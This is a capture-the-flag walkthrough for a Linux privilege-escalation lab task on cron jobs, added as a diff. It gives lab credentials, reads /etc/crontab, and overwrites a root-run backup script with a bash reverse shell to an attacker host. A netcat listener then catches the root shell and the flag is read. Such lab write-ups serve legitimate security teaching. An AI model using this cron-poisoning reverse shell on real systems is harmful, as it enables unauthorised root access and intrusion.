@@ -1,0 +1,52 @@
+TASK_9
+Linux Privilege Escalation > Task 9 "Cron Jobs"
+
+
+_____________________
+|Username: karen    |
+|Password: Password1|
+---------------------
+
+
+Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user, although they can provide a privilege escalation vector under specific conditions. Each user on the system have their crontab file and can run specific tasks whether they are logged in or not.
+
+Any user can read the file keeping system-wide cron jobs under /etc/crontab (its the right time to connect via ssh to the target)
+input   :   cat /etc/crontab
+outpt   :   ...
+            * * * * *  root /antivirus.sh
+            * * * * *  root antivirus.sh
+            * * * * *  root /home/karen/backup.sh
+            * * * * *  root /tmp/test.py
+As we can see we have 4 scripts that run every minute, every hour of the day, every day of the month and week and every month of the year (so the answer in the first question is 4).
+
+Lets poison a script that exists in the system in order to open a root shell (in "/" working directory)
+input   :   find -name backup.sh 2>/dev/null
+outpt   :   ./home/karen/backup.sh
+Tip     :   "2>/dev/null" sends the errors to /dev/null in order not to be printed into the terminal as it can print a vast amount of those!
+
+Modify it like this in order to open a root shell
+###
+#!/bin/bash
+
+bash -i >& /dev/tcp/<MACHINA>/<LPORT> 0>&1
+###
+Tip     :   LPORT = Listening Port
+
+And give it the right permissions to run by the system
+input   :   chmod +x backup.sh
+outpt   :   //Bank. Hit "ls -la" to verify it
+
+In our MACHINA
+input   :   sudo nc -lvnp <LPORT>
+outpt   :   listening on [any] <LPORT> ...
+            ...
+Tip     :   keep in mind that the script will run every minute. maybe you have to be patient a bit after you will open the listener
+And there we are!
+
+Now find the flag
+input   :   cat <PATH_TO_THE_FLAG>
+outpt   :   <FLAG>.txt
+
+
+
+made by @gr1m.r3ap3r
